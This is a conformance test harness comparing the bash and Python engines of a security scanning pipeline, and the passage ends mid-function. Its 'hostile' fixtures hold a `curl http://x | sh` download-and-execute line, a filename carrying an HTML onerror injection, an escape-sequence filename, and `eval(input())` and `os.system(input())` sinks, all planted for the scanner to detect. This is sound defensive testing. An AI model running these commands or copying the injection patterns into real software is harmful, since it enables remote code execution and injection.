#!/usr/bin/env python3
"""Golden-master and differential harness for the bash and the Python engine.

    python3 tests/conformance/conformance.py list
    python3 tests/conformance/conformance.py capture [--engine bash] [--case NAME ...]
    python3 tests/conformance/conformance.py check   [--engine bash|python] [--case NAME ...]
    python3 tests/conformance/conformance.py diff    [--case NAME ...]        # bash against python, live

An engine is run on each case with the three-argument usage, its JSON report is normalised (paths made
relative, ordering fixed, run-specific fields dropped) and compared with the stored golden file, or with the
other engine. The normalised shape is the equivalence contract in docs/engine_contract.md. Standard library only.

    python3 tests/conformance/conformance.py selftest                         # the checks of this file itself, no engine run

The golden files were captured from the hardened bash engine (2026-11-13) and are the target of the Python engine.
For --engine python only, PYTHON_ACCEPTED_DIVERGENCES lists the differences that were accepted on purpose; it is
empty, because the one the design asked for (the WARN transitignore:exclusions_applied( of D-004) is emitted by the
hardened bash engine and is in the goldens. See docs/engine_contract.md, section 4 ("Accepted divergences").
"""
from __future__ import annotations

import argparse
import copy
import difflib
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable

ROOT = Path(__file__).resolve().parents[2]
GOLDEN = Path(__file__).resolve().parent / "golden"
FIXTURES = ROOT / "tests" / "fixtures"
PYTHON_ENTRY = ROOT / "scan_pipeline.py"
ENGINES = {
    "bash": ["bash", str(ROOT / "scan_pipeline.sh")],
    # -I is what `TRANSIT_ENGINE=python bash scan_pipeline.sh` runs (docs/python_engine_design.md section 15): no
    # PYTHON* variable and no user site reach the engine, so a case measures the engine and not the caller's shell.
    "python": [sys.executable, "-I", str(PYTHON_ENTRY)],
}
# Tools whose presence changes the coverage block and the warnings; recorded with every golden file.
TOOLS = ["gitleaks", "detect-secrets", "clamscan", "yara", "semgrep", "trivy", "pip-audit", "safety", "npm",
         "scancode", "bandit", "shellcheck", "cppcheck", "hadolint", "checkov", "file", "strings", "unzip"]
# Fields that differ on every run or by design, and are not part of the contract.
DROP_TOP = {"timestamp", "directory", "repo_hash", "repo_input"}


@dataclass
class Case:
    name: str
    build: Callable[[Path], Path]          # makes the directory to scan inside a scratch base
    env: dict = field(default_factory=dict)  # values may use {base} and {scan}
    scan_name: str = "conf"
    dir_suffix: str = ""                   # e.g. "/" to pass a trailing slash
    pre_work: dict = field(default_factory=dict)  # relative path under WORK_DIR -> content
    note: str = ""


def _copy_fixture(name: str) -> Callable[[Path], Path]:
    def build(base: Path) -> Path:
        dst = base / "scan"
        shutil.copytree(FIXTURES / name, dst, ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
        return dst
    return build


def _fixture_plus(name: str, extra: Callable[[Path], None]) -> Callable[[Path], Path]:
    def build(base: Path) -> Path:
        dst = _copy_fixture(name)(base)
        extra(dst)
        return dst
    return build


def _write(path: Path, data: bytes | str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data if isinstance(data, bytes) else data.encode())


def _hostile(files: dict[bytes, bytes]) -> Callable[[Path], Path]:
    def build(base: Path) -> Path:
        dst = base / "scan"
        dst.mkdir()
        for name, data in files.items():
            with open(os.path.join(os.fsencode(dst), name), "wb") as fh:
                fh.write(data)
        return dst
    return build


GITLEAKS_STUB = """#!/bin/sh
if [ "$1 $2" = "detect --help" ]; then
    echo "  --no-banner  --redact  --log-level  --gitleaks-ignore-path  --ignore-gitleaks-allow"; exit 0
fi
rep=""
while [ $# -gt 0 ]; do case "$1" in --report-path) rep="$2" ;; esac; shift; done
echo "LEAKED-SECRET-MARKER"
if [ -n "${GITLEAKS_STUB_REPORT:-}" ] && [ -n "$rep" ]; then cp "$GITLEAKS_STUB_REPORT" "$rep"; fi
exit ${GITLEAKS_STUB_EXIT:-0}
"""


def _gitleaks_stub(base: Path) -> Path:
    scan = _copy_fixture("clean")(base)
    _write(base / "stubs" / "gitleaks", GITLEAKS_STUB)
    (base / "stubs" / "gitleaks").chmod(0o755)
    _write(base / "stub_report.json",
           json.dumps([{"File": str(scan / "leak.py"), "StartLine": 3, "RuleID": "generic-api-key", "Secret": "REDACTED"}]))
    _write(scan / "leak.py", "x = 1\n")
    return scan


def _stubbed(fixture: str, stubs: dict[str, str], extra: Callable[[Path], None] | None = None) -> Callable[[Path], Path]:
    """The fixture, plus stub programs in <base>/stubs (put first on PATH by the case's env). A stub is the body of a
    sh script. Staged data (rule sets, signatures, a YARA rule) goes in the case's pre_work: it lives under
    WORK_DIR, so its path is normalised to <WORK> in the report."""
    def build(base: Path) -> Path:
        dst = _copy_fixture(fixture)(base)
        for name, body in stubs.items():
            _write(base / "stubs" / name, "#!/bin/sh\n" + body + "\n")
            (base / "stubs" / name).chmod(0o755)
        if extra:
            extra(dst)
        return dst
    return build


STUB_PATH = {"PATH": "{base}/stubs:" + os.environ.get("PATH", "")}
FOUR_RULESETS = {"offline-cache/semgrep-rules/%s.yaml" % n: "rules: []\n"
                 for n in ("owasp-top-ten", "cwe-top-25", "security-audit", "secrets")}
SEMGREP_OK = "echo '{\"results\":[]}'"

CASES: list[Case] = [
    Case("clean", _copy_fixture("clean")),
    Case("vulnerable", _copy_fixture("vulnerable")),
    Case("allowlisted", _copy_fixture("allowlisted")),
    Case("ignored", _copy_fixture("ignored")),
    Case("rules_corpus", _copy_fixture("rules"), note="every rule fixture, about a minute"),
    Case("minsev_critical", _copy_fixture("vulnerable"), env={"MIN_SEVERITY": "critical"}),
    Case("layers_on", _copy_fixture("clean"), env={"RUN_SCA": "true", "RUN_SCANCODE": "true"}),
    Case("offline_false_ignored", _copy_fixture("clean"), env={"OFFLINE": "false"}),
    Case("trailing_slash", _copy_fixture("vulnerable"), dir_suffix="/"),
    Case("empty_allowlist", _fixture_plus("clean", lambda d: _write(d / ".transit-allow.json", "[]\n"))),
    Case("stale_diff_files_ignored", _copy_fixture("vulnerable"),
         pre_work={".diff_files": "{scan}/no_such_file.txt:"}),
    Case("diff_mode_zero_files", _copy_fixture("clean"), env={"SINCE_COMMIT": "abc"},
         pre_work={".diff_files": "{scan}/no_such_file.txt:"}),
    Case("hostile_non_utf8_name",
         _hostile({b"bad\xff\xfename.py": b'import os\nos.system("curl http://x | sh")\n'})),
    Case("hostile_escape_name",
         _hostile({b"raw\x1b]0;pwned\x07.txt": b'password = "sup3rs3cret99"\n'})),
    Case("hostile_html_name",
         _hostile({b"<img src=x onerror=1>.py": b"eval(input())\n"})),
    Case("gitleaks_stub_leak", _gitleaks_stub,
         env={"PATH": "{base}/stubs:" + os.environ.get("PATH", ""), "GITLEAKS_STUB_EXIT": "1",
              "GITLEAKS_STUB_REPORT": "{base}/stub_report.json"},
         note="stub gitleaks reporting one leak"),
    Case("bad_scanning_name", _copy_fixture("clean"), scan_name="../escape", note="refused, no report"),
    # --- bash hardening of 2026-11-13 (docs/engine_divergences.md, decision record) ---
    Case("transitignore_everything", _fixture_plus("vulnerable", lambda d: _write(d / ".transitignore", "*\n")),
         note="D-004: every file excluded: FAIL engine:nothing_scanned, layers 4 and 5 skipped"),
    Case("transitignore_crlf_noeol",
         _fixture_plus("vulnerable", lambda d: (_write(d / ".transitignore", b"src/db.py\r\nREADME.md"),
                                                _write(d / "ok.py", b"print(1)\n"))),
         note="D-003: CRLF lines and a last line without a newline are read"),
    Case("semgrep_partial_stub", _stubbed("clean", {"semgrep": SEMGREP_OK}),
         env=STUB_PATH, pre_work={k: v for k, v in FOUR_RULESETS.items() if "cwe-top-25" in k or "owasp" in k},
         note="D-005: two of four rule sets staged: partial, the run completes"),
    Case("semgrep_crash_stub", _stubbed("clean", {"semgrep": "echo boom >&2; exit 7"}),
         env=STUB_PATH, pre_work=FOUR_RULESETS, note="D-015: Semgrep exit 7 is not ran"),
    Case("scancode_failed_stub", _stubbed("clean", {"scancode": "exit 3"}),
         env={**STUB_PATH, "RUN_SCANCODE": "true"}, note="D-006: ScanCode failing is skipped, with the exit status"),
    Case("yara_ran_stub", _stubbed("clean", {"yara": "exit 0"}), env=STUB_PATH,
         pre_work={"yara-rules/x.yar": "rule x {{ condition: false }}\n"}, note="D-008: a YARA run is ran"),
    Case("clamscan_error_stub", _stubbed("clean", {"clamscan": "exit 2"}), env=STUB_PATH,
         pre_work={"offline-cache/clamav/main.cvd": "x"}, note="D-015: clamscan exit 2 is a tool error, not malware"),
    Case("js_ruleset_unstaged_stub",
         _stubbed("clean", {"semgrep": SEMGREP_OK}, lambda d: _write(d / "src" / "app.js", "console.log(1);\n")),
         env=STUB_PATH, pre_work=FOUR_RULESETS, note="D-037: JavaScript file, no javascript.yaml: L5 partial"),
    Case("diff_mode_nul_names",
         _fixture_plus("vulnerable", lambda d: _write(d / "a:b.py", "import os\nos.system(input())\n")),
         env={"SINCE_COMMIT": "abc"}, pre_work={".diff_files": "a:b.py\x00"},
         note="D-042: a NUL-separated .diff_files with a name that holds ':'"),
]


def tools_present() -> list[str]:
    return [t for t in TOOLS if shutil.which(t)]


def _rel_factory(scan: Path, work: Path):
    scans = {str(scan), os.path.realpath(scan)}
    works = {str(work), os.path.realpath(work)}

    def rel(s):
        if isinstance(s, str):
            for w in works:
                s = s.replace(w, "<WORK>")
            # the ScanCode result is named after the run's timestamp, and a WARN names it (contract section 10)
            s = re.sub(r"scancode_[0-9]{8}_[0-9]{6}\.json", "scancode_<TS>.json", s)
            for d in scans:
                s = s.replace(d + "/", "").replace(d, ".")
            return s
        if isinstance(s, list):
            return [rel(x) for x in s]
        if isinstance(s, dict):
            return {rel(k): rel(v) for k, v in s.items()}
        return s
    return rel


def _msgs(text: str) -> list[str]:
    return sorted(m.strip() for m in (text or "").split(" | ") if m.strip())


def normalize(report: dict | None, scan: Path, work: Path) -> dict | None:
    """The shape the two engines must agree on. Anything run-specific is dropped or made relative."""
    if report is None:
        return None
    rel = _rel_factory(scan, work)
    out = {k: v for k, v in report.items() if k not in DROP_TOP}
    src = dict(out.get("source", {}))
    src.pop("directory", None)
    out["source"] = src
    if "coverage_gaps" in out:
        out["coverage_gaps"] = sorted(out["coverage_gaps"])
    out["file_results"] = {
        rel(k): {"status": v.get("status"), "messages": rel(_msgs(v.get("message", "")))}
        for k, v in sorted(report.get("file_results", {}).items())}
    fbf = report.get("findings_by_file", {})
    out["findings_by_file"] = {rel(k): rel(_msgs(v)) for k, v in sorted(fbf.items())}
    fields = ("tool", "category", "severity", "rule_id", "rule_name", "file", "line", "message", "references")
    recs = [{f: rel(r.get(f)) for f in fields} for r in report.get("findings", [])]
    out["findings"] = sorted(recs, key=lambda r: (str(r["file"]), str(r["rule_id"]), r["line"] or 0, str(r["message"])))
    return rel(out)


@dataclass(frozen=True)
class AcceptedDivergence:
    """One difference between the Python engine and the bash golden files that was accepted on purpose.

    It can drop one WARN from one file_results entry and lower summary.warn by one, and nothing else. `id` is the entry
    of docs/engine_divergences.md that accepted it; `cases` are the cases it applies to (never all of them: name them);
    `file` is the key of file_results after normalisation (`__global__`, or a path relative to the scanned directory);
    `warn_prefix` is the start of the message, without the `[WARN] ` tag. `status_after` is the status of that file once
    the message is gone, for the case where dropping it changes the status. An entry that matches nothing in a case it
    names is reported as stale (the engine no longer differs, so delete the entry): it is a failure of the comparison.
    """
    id: str
    cases: tuple[str, ...]
    file: str
    warn_prefix: str
    status_after: str | None = None
    why: str = ""


# Empty on purpose. The design (docs/python_engine_design.md 14.1, WP-13) asked for one entry: the WARN
# `transitignore:exclusions_applied(` of D-004 on `__global__`, dropped from the Python report before the comparison with
# golden `ignored`, because bash could not emit it. The hardened bash engine does (D-004 is closed in bash, and the
# goldens `ignored`, `transitignore_crlf_noeol` and `transitignore_everything` carry it), so the entry would be stale on
# its first run and was not written. Every difference between the Python engine and the goldens is a failure.
PYTHON_ACCEPTED_DIVERGENCES: tuple[AcceptedDivergence, ...] = ()


def apply_accepted_divergences(engine: str, case: str, report: dict | None,
                               table: tuple[AcceptedDivergence, ...] | None = None) -> tuple[dict | None, list[str]]:
    """The normalised `report` with the accepted divergences of `engine` removed, and the ids of the stale entries.

    Only `--engine python` is touched (the bash reports are the goldens). `report` is not modified."""
    if engine != "python" or report is None:
        return report, []
    out = copy.deepcopy(report)
    stale: list[str] = []
    for d in PYTHON_ACCEPTED_DIVERGENCES if table is None else table:
        if case not in d.cases:
            continue
        entry = out.get("file_results", {}).get(d.file)
        tag = "[WARN] " + d.warn_prefix
        hit = None if entry is None else next((i for i, m in enumerate(entry["messages"]) if m.startswith(tag)), None)
        if hit is None:
            stale.append(d.id)
            continue
        del entry["messages"][hit]
        out["summary"]["warn"] -= 1
        if d.status_after is not None:
            entry["status"] = d.status_after
    return out, stale


def engine_env(engine: str, extra: dict, work: Path) -> dict:
    """The environment an engine runs in: the caller's, LC_ALL, WORK_DIR, the case's own variables, and a TRANSIT_ENGINE
    that cannot make `scan_pipeline.sh` run the other engine."""
    env = dict(os.environ, LC_ALL="C.UTF-8", WORK_DIR=str(work))
    env.update(extra)
    if engine == "bash":
        env["TRANSIT_ENGINE"] = "bash"       # scan_pipeline.sh hands over to the Python engine when this says python
    else:
        env.pop("TRANSIT_ENGINE", None)      # scan_pipeline.py is started directly: the variable means nothing to it
    return env


def run_case(engine: str, case: Case, keep: bool = False) -> dict:
    base = Path(tempfile.mkdtemp(prefix="conf_"))
    try:
        scan = case.build(base)
        work, reports = base / "work", base / "reports"
        work.mkdir()
        reports.mkdir()
        fmt = {"base": str(base), "scan": str(scan)}
        for rel_path, content in case.pre_work.items():
            _write(work / rel_path, content.format(**fmt))
        env = engine_env(engine, {k: v.format(**fmt) for k, v in case.env.items()}, work)
        cmd = ENGINES[engine] + [str(scan) + case.dir_suffix, str(reports), case.scan_name]
        proc = subprocess.run(cmd, env=env, capture_output=True, timeout=900)
        stdout = proc.stdout.decode("utf-8", "replace").strip().splitlines()
        found = sorted(reports.glob("report_scan_*.json"))
        report = json.loads(found[0].read_text(encoding="utf-8")) if found else None
        shown, stale = apply_accepted_divergences(engine, case.name, normalize(report, scan, work))
        res = {"exit": proc.returncode, "last_line": stdout[-1] if stdout else "", "report": shown}
        if stale:   # an accepted divergence that no longer exists must be deleted: show it as a difference
            res["stale_accepted_divergences"] = stale
        return res
    finally:
        if not keep:
            shutil.rmtree(base, ignore_errors=True)


def _dump(obj) -> list[str]:
    return json.dumps(obj, indent=1, sort_keys=True, ensure_ascii=True).splitlines()


def _diff(a, b, la: str, lb: str, limit: int = 40) -> str:
    d = list(difflib.unified_diff(_dump(a), _dump(b), la, lb, lineterm="", n=1))
    return "\n".join(d[:limit] + (["... (%d more lines)" % (len(d) - limit)] if len(d) > limit else []))


def _select(names: list[str] | None) -> list[Case]:
    if not names:
        return CASES
    known = {c.name: c for c in CASES}
    missing = [n for n in names if n not in known]
    if missing:
        sys.exit("unknown case(s): %s (try: list)" % ", ".join(missing))
    return [known[n] for n in names]


def cmd_capture(args) -> int:
    GOLDEN.mkdir(parents=True, exist_ok=True)
    meta = {"engine": args.engine, "tools_present": tools_present(), "locale": "C.UTF-8"}
    for case in _select(args.case):
        res = run_case(args.engine, case)
        (GOLDEN / f"{case.name}.json").write_text(
            json.dumps({"meta": meta, **res}, indent=1, sort_keys=True, ensure_ascii=True) + "\n", encoding="utf-8")
        print("captured %-26s exit=%s %s" % (case.name, res["exit"], res["last_line"]))
    return 0


def cmd_check(args) -> int:
    bad = 0
    for case in _select(args.case):
        gf = GOLDEN / f"{case.name}.json"
        if not gf.exists():
            print("MISSING golden for %s (run capture)" % case.name)
            bad += 1
            continue
        golden = json.loads(gf.read_text(encoding="utf-8"))
        if golden["meta"]["tools_present"] != tools_present() and not args.quiet:
            print("note: golden captured with tools %s, now %s" % (golden["meta"]["tools_present"], tools_present()))
        res = run_case(args.engine, case)
        want = {k: golden[k] for k in ("exit", "last_line", "report")}
        if res == want:
            print("ok   %s" % case.name)
        else:
            bad += 1
            print("DIFF %s\n%s" % (case.name, _diff(want, res, "golden", args.engine)))
    print("\n%d case(s) differ" % bad if bad else "\nall cases match the golden files")
    return 1 if bad else 0


def cmd_diff(args) -> int:
    if not PYTHON_ENTRY.exists():
        sys.exit("the Python engine does not exist yet (scan_pipeline.py)")
    bad = 0
    for case in _select(args.case):
        a, b = run_case("bash", case), run_case("python", case)
        if a == b:
            print("ok   %s" % case.name)
        else:
            bad += 1
            print("DIFF %s\n%s" % (case.name, _diff(a, b, "bash", "python")))
    return 1 if bad else 0


# --- self-test: `conformance.py selftest` ----------------------------------------------------------------------------
# Checks of this file, no engine is run. They cover the normaliser, the choice of engine and its environment, the table of
# accepted divergences, and that docs/engine_contract.md describes every coverage state of the goldens.
CONTRACT = ROOT / "docs" / "engine_contract.md"
LAYER_IDS = {"L1_secrets_gitleaks", "L1_secrets_entropy", "L1_malware", "L1_ioc_yara", "L2_owasp_cwe", "L3_dependency_cve",
             "L4_patterns", "L5_per_language_sast", "L6_licence"}


def _golden(name: str) -> dict:
    return json.loads((GOLDEN / f"{name}.json").read_text(encoding="utf-8"))


def _golden_reports() -> dict[str, dict]:
    out = {}
    for f in sorted(GOLDEN.glob("*.json")):
        rep = json.loads(f.read_text(encoding="utf-8")).get("report")
        if rep:
            out[f.stem] = rep
    return out


class NormaliseTests(unittest.TestCase):
    SCAN, WORK = Path("/srv/scan"), Path("/srv/work")

    def raw(self) -> dict:
        return {
            "verdict": "FAIL", "timestamp": "2026-11-13T00:00:00Z", "directory": "/srv/scan", "repo_hash": "h" * 64,
            "repo_input": "https://x", "source": {"directory": "/srv/scan", "sha256": "s" * 64},
            "coverage_gaps": ["L6_licence", "L1_malware"], "summary": {"pass": 1, "warn": 2, "fail": 1},
            "file_results": {
                "/srv/scan/b.py": {"status": "FAIL", "message": "[WARN] z | [FAIL] a | [WARN] m"},
                "__global__": {"status": "WARN", "message": "[WARN] OFFLINE:stage it in /srv/work/offline-cache | [WARN] a"}},
            "findings_by_file": {"/srv/scan/b.py": "a", "/srv/scan": "c | b"},
            "findings": [
                {"tool": "t", "category": "cwe", "severity": "HIGH", "rule_id": "R2", "rule_name": "n", "file": "b.py",
                 "line": 3, "column": 7, "message": "m2", "references": []},
                {"tool": "t", "category": "cwe", "severity": "HIGH", "rule_id": "R1", "rule_name": "n", "file": "b.py",
                 "line": None, "column": None, "message": "m1", "references": []}]}

    def test_run_specific_fields_are_dropped(self):
        out = normalize(self.raw(), self.SCAN, self.WORK)
        for k in ("timestamp", "directory", "repo_hash", "repo_input"):
            self.assertNotIn(k, out)
        self.assertEqual(out["source"], {"sha256": "s" * 64})

    def test_paths_are_relative_and_the_work_directory_is_a_placeholder(self):
        out = normalize(self.raw(), self.SCAN, self.WORK)
        self.assertEqual(sorted(out["file_results"]), ["__global__", "b.py"])
        self.assertEqual(out["file_results"]["__global__"]["messages"],
                         sorted(["[WARN] OFFLINE:stage it in <WORK>/offline-cache", "[WARN] a"]))
        self.assertEqual(sorted(out["findings_by_file"]), [".", "b.py"])

    def test_messages_are_split_on_the_separator_and_sorted(self):
        out = normalize(self.raw(), self.SCAN, self.WORK)
        self.assertEqual(out["file_results"]["b.py"]["messages"], ["[FAIL] a", "[WARN] m", "[WARN] z"])
        self.assertEqual(out["findings_by_file"]["."], ["b", "c"])

    def test_findings_are_sorted_and_the_column_is_not_compared(self):
        out = normalize(self.raw(), self.SCAN, self.WORK)
        self.assertEqual([r["rule_id"] for r in out["findings"]], ["R1", "R2"])
        self.assertTrue(all("column" not in r for r in out["findings"]))
        self.assertEqual(out["coverage_gaps"], ["L1_malware", "L6_licence"])

    def test_no_report_stays_none(self):
        self.assertIsNone(normalize(None, self.SCAN, self.WORK))


class EngineSelectionTests(unittest.TestCase):
    def test_python_runs_isolated(self):
        self.assertEqual(ENGINES["python"][:2], [sys.executable, "-I"])
        self.assertEqual(ENGINES["python"][2], str(ROOT / "scan_pipeline.py"))
        self.assertEqual(PYTHON_ENTRY, ROOT / "scan_pipeline.py")

    def test_bash_runs_the_script(self):
        self.assertEqual(ENGINES["bash"], ["bash", str(ROOT / "scan_pipeline.sh")])

    def test_the_callers_transit_engine_cannot_pick_the_engine(self):
        # scan_pipeline.sh execs the Python engine when TRANSIT_ENGINE=python (design section 15)
        saved = os.environ.get("TRANSIT_ENGINE")
        os.environ["TRANSIT_ENGINE"] = "python"
        try:
            self.assertEqual(engine_env("bash", {}, Path("/w"))["TRANSIT_ENGINE"], "bash")
            self.assertNotIn("TRANSIT_ENGINE", engine_env("python", {}, Path("/w")))
        finally:
            if saved is None:
                os.environ.pop("TRANSIT_ENGINE", None)
            else:
                os.environ["TRANSIT_ENGINE"] = saved

    def test_environment_has_the_work_directory_the_locale_and_the_cases_variables(self):
        env = engine_env("bash", {"RUN_SCA": "true", "LC_ALL": "C"}, Path("/w"))
        self.assertEqual((env["WORK_DIR"], env["RUN_SCA"], env["LC_ALL"]), ("/w", "true", "C"))
        self.assertEqual(engine_env("python", {}, Path("/w"))["LC_ALL"], "C.UTF-8")


class AcceptedDivergenceTests(unittest.TestCase):
    EXTRA = "[WARN] x:extra_warn_of_the_python_engine"
    ENTRY = AcceptedDivergence(id="D-999", cases=("clean",), file="__global__", warn_prefix="x:extra_warn")

    def python_report(self, *extra: str) -> dict:
        rep = copy.deepcopy(_golden("clean")["report"])
        glob = rep["file_results"]["__global__"]
        for m in extra:
            glob["messages"] = sorted(glob["messages"] + [m])
            rep["summary"]["warn"] += 1
        return rep

    def test_entries_of_the_real_table_are_well_formed(self):
        names = {c.name for c in CASES}
        for d in PYTHON_ACCEPTED_DIVERGENCES:
            self.assertRegex(d.id, r"^D-[0-9]{3}$")
            self.assertTrue(d.cases and d.file and d.warn_prefix)
            self.assertLessEqual(set(d.cases), names)

    def test_the_d004_warn_is_not_a_divergence_because_bash_emits_it(self):
        # the entry the design asked for (WP-13) was dropped: bash records the WARN and the goldens carry it
        for case in ("ignored", "transitignore_crlf_noeol", "transitignore_everything"):
            msgs = _golden(case)["report"]["file_results"]["__global__"]["messages"]
            self.assertTrue(any(m.startswith("[WARN] transitignore:exclusions_applied(") for m in msgs), case)
        for d in PYTHON_ACCEPTED_DIVERGENCES:
            self.assertFalse(d.warn_prefix.startswith("transitignore:"), d.id)
        ign = _golden("ignored")["report"]
        self.assertEqual(apply_accepted_divergences("python", "ignored", ign), (ign, []))

    def test_bash_reports_are_never_touched(self):
        rep = self.python_report(self.EXTRA)
        self.assertEqual(apply_accepted_divergences("bash", "clean", rep, (self.ENTRY,)), (rep, []))

    def test_python_loses_exactly_the_named_warn_and_one_warn_of_the_summary(self):
        out, stale = apply_accepted_divergences("python", "clean", self.python_report(self.EXTRA), (self.ENTRY,))
        self.assertEqual(stale, [])
        self.assertEqual(out, _golden("clean")["report"])

    def test_an_unrelated_warn_stays_so_the_comparison_goes_red(self):
        rep = self.python_report(self.EXTRA, "[WARN] y:an_unrelated_warn")
        out, stale = apply_accepted_divergences("python", "clean", rep, (self.ENTRY,))
        self.assertEqual(stale, [])
        self.assertNotEqual(out, _golden("clean")["report"])
        self.assertIn("[WARN] y:an_unrelated_warn", out["file_results"]["__global__"]["messages"])
        self.assertEqual(out["summary"]["warn"], _golden("clean")["report"]["summary"]["warn"] + 1)

    def test_an_entry_drops_one_message_not_every_message_with_the_prefix(self):
        rep = self.python_report(self.EXTRA, "[WARN] x:extra_warn_a_second_time")
        out, _ = apply_accepted_divergences("python", "clean", rep, (self.ENTRY,))
        self.assertEqual(sum(1 for m in out["file_results"]["__global__"]["messages"] if m.startswith("[WARN] x:extra_warn")), 1)
        self.assertEqual(out["summary"]["warn"], _golden("clean")["report"]["summary"]["warn"] + 1)

    def test_the_entry_names_its_file(self):
        rep = self.python_report(self.EXTRA)
        other = AcceptedDivergence(id="D-998", cases=("clean",), file="src/app.py", warn_prefix="x:extra_warn")
        out, stale = apply_accepted_divergences("python", "clean", rep, (other,))
        self.assertEqual((out, stale), (rep, ["D-998"]))

    def test_an_entry_applies_to_its_cases_only(self):
        rep = self.python_report(self.EXTRA)
        self.assertEqual(apply_accepted_divergences("python", "vulnerable", rep, (self.ENTRY,)), (rep, []))

    def test_an_entry_that_matches_nothing_is_stale(self):
        clean = _golden("clean")["report"]
        out, stale = apply_accepted_divergences("python", "clean", clean, (self.ENTRY,))
        self.assertEqual((out, stale), (clean, ["D-999"]))

    def test_status_after_is_applied(self):
        rep = {"file_results": {"f": {"status": "WARN", "messages": ["[WARN] x:only"]}}, "summary": {"pass": 0, "warn": 1, "fail": 0}}
        entry = AcceptedDivergence(id="D-997", cases=("c",), file="f", warn_prefix="x:only", status_after="PASS")
        out, stale = apply_accepted_divergences("python", "c", rep, (entry,))
        self.assertEqual(stale, [])
        self.assertEqual(out["file_results"]["f"], {"status": "PASS", "messages": []})
        self.assertEqual(out["summary"]["warn"], 0)

    def test_the_report_it_is_given_is_not_modified(self):
        rep = self.python_report(self.EXTRA)
        before = copy.deepcopy(rep)
        apply_accepted_divergences("python", "clean", rep, (self.ENTRY,))
        self.assertEqual(rep, before)

    def test_no_report_is_no_report(self):
        self.assertEqual(apply_accepted_divergences("python", "clean", None, (self.ENTRY,)), (None, []))


class RunCaseTests(unittest.TestCase):
    """run_case and cmd_check with `subprocess.run` replaced: what is run, with which environment, and what is compared."""

    RAW_WARN = "[WARN] x:extra_warn_of_the_python_engine"

    def fake_run(self, seen: list):
        def run(cmd, env=None, capture_output=None, timeout=None):
            seen.append((list(cmd), dict(env or {})))
            rdir = Path(cmd[-2])
            raw = {"verdict": "PASS", "timestamp": "t", "directory": cmd[-3], "repo_hash": "h", "repo_input": "",
                   "source": {"directory": cmd[-3], "sha256": "s" * 64}, "coverage_gaps": [],
                   "summary": {"pass": 1, "warn": 1, "fail": 0},
                   "file_results": {"__global__": {"status": "WARN", "message": self.RAW_WARN}},
                   "findings_by_file": {}, "findings": []}
            (rdir / "report_scan_conf.json").write_text(json.dumps(raw), encoding="utf-8")
            return subprocess.CompletedProcess(cmd, 0, stdout=b"[INFO] x\nPASS\n", stderr=b"")
        return run

    def case(self) -> Case:
        return Case("clean", lambda base: (base / "scan").mkdir() or (base / "scan"))

    def run_with(self, engine: str, table=()):
        seen: list = []
        saved = os.environ.get("TRANSIT_ENGINE")
        os.environ["TRANSIT_ENGINE"] = "python"
        real = subprocess.run
        subprocess.run = self.fake_run(seen)
        saved_table = globals()["PYTHON_ACCEPTED_DIVERGENCES"]
        globals()["PYTHON_ACCEPTED_DIVERGENCES"] = table
        try:
            res = run_case(engine, self.case())
        finally:
            subprocess.run = real
            globals()["PYTHON_ACCEPTED_DIVERGENCES"] = saved_table
            if saved is None:
                os.environ.pop("TRANSIT_ENGINE", None)
            else:
                os.environ["TRANSIT_ENGINE"] = saved
        return res, seen[0]

    def test_python_is_started_isolated_and_without_the_callers_engine_choice(self):
        _, (cmd, env) = self.run_with("python")
        self.assertEqual(cmd[:3], [sys.executable, "-I", str(PYTHON_ENTRY)])
        self.assertNotIn("TRANSIT_ENGINE", env)

    def test_bash_is_started_with_its_own_engine_choice(self):
        _, (cmd, env) = self.run_with("bash")
        self.assertEqual(cmd[:2], ["bash", str(ROOT / "scan_pipeline.sh")])
        self.assertEqual(env["TRANSIT_ENGINE"], "bash")

    def test_the_table_is_applied_to_a_python_run_and_not_to_a_bash_run(self):
        entry = AcceptedDivergence(id="D-999", cases=("clean",), file="__global__", warn_prefix="x:extra_warn")
        res, _ = self.run_with("python", (entry,))
        self.assertEqual(res["report"]["file_results"]["__global__"]["messages"], [])
        self.assertEqual(res["report"]["summary"]["warn"], 0)
        self.assertNotIn("stale_accepted_divergences", res)
        res, _ = self.run_with("bash", (entry,))
        self.assertEqual(res["report"]["file_results"]["__global__"]["messages"], [self.RAW_WARN])

    def test_a_stale_entry_is_a_difference_in_check(self):
        entry = AcceptedDivergence(id="D-999", cases=("clean",), file="__global__", warn_prefix="no_such_message")
        res, _ = self.run_with("python", (entry,))
        self.assertEqual(res["stale_accepted_divergences"], ["D-999"])
        golden = _golden("clean")
        want = {k: golden[k] for k in ("exit", "last_line", "report")}
        args = argparse.Namespace(engine="python", case=["clean"], quiet=True)
        real = globals()["run_case"]
        out = []
        try:
            for result, code in ((dict(want), 0), (dict(want, stale_accepted_divergences=["D-999"]), 1)):
                globals()["run_case"] = lambda engine, case, keep=False, _r=result: _r
                buf = _Capture()
                with buf:
                    self.assertEqual(cmd_check(args), code)
                out.append(buf.text)
        finally:
            globals()["run_case"] = real
        self.assertIn("ok   clean", out[0])
        self.assertIn("DIFF clean", out[1])
        self.assertIn("stale_accepted_divergences", out[1])


class _Capture:
    """Collects what cmd_check prints, without redirecting the stream of the test runner for longer than the call."""

    def __enter__(self):
        import io
        self._old, self._buf = sys.stdout, io.StringIO()
        sys.stdout = self._buf
        return self

    def __exit__(self, *exc):
        sys.stdout = self._old
        self.text = self._buf.getvalue()
        return False


class ContractTests(unittest.TestCase):
    """docs/engine_contract.md section 7 against the goldens: the document is wrong the day a state is not in it."""

    def states_of_section_7(self) -> list[re.Pattern]:
        text = CONTRACT.read_text(encoding="utf-8")
        a, b = text.index("## 7. Coverage block"), text.index("## 8. File selection")
        spans: list[str] = []
        for row in text[a:b].splitlines():
            if row.startswith("|"):
                spans += re.findall(r"`([^`]+)`", row.strip().strip("|").split("|")[-1])
        return [re.compile("^" + ".+".join(re.escape(x) for x in re.split(r"<[^>]*>", sp)) + "$") for sp in spans]

    # `engine:` messages of the Python engine only (docs/python_engine_design.md section 8.3): bash never says them
    PYTHON_ONLY = ("engine:directory_unreadable", "engine:diff_entries_unresolved", "engine:scanner_error", "engine:<kind>")
    MESSAGE_PREFIXES = ("engine:", "symlink:", "skipped:", "partial:", "semgrep:", "yara:", "clamav:", "detect-secrets:",
                        "trivy:", "scancode:", "transitignore:", "gitleaks:", "OFFLINE:")

    def test_every_message_and_state_the_contract_quotes_is_in_the_bash_script(self):
